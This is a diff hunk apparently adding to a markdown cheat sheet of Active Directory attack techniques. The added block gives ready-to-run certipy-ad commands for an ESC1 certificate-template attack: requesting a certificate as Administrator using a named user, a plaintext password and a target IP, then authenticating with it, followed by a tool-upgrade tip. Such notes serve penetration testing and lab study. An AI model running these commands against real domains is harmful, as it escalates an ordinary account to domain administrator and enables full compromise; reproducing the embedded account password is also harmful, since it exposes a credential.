@@ -225,6 +225,15 @@ certipy-ad find -u xxx -p xxxx -dc-ip xxx.xxx.xxx.xxx -stdout -vulnerable
 https://github.com/ly4k/Certipy?tab=readme-ov-file#certificates
 ```
 ![image](https://github.com/user-attachments/assets/c6e89df4-194f-4e7b-a9c8-9b6c82a159b0)
+```
+ESC1:
+
+certipy-ad req -username Tracy.White@nara-security.com -password zqwj041FGX -target-ip 192.168.168.30 -ca 'NARA-CA' -template 'NaraUser' -upn Administrator@NARA-SECURITY.COM
+certipy-ad auth -pfx administrator.pfx -username Administrator -domain 'nara-security.com' -dc-ip 192.168.168.30
+
+Tip:
+"python3 -m pip install --upgrade certipy-ad" and "sudo apt-get update&upgrade" somethines could solve the issue 
+```
 #### Resource Based Constrained Delegation Attack
 ```
 Detection:
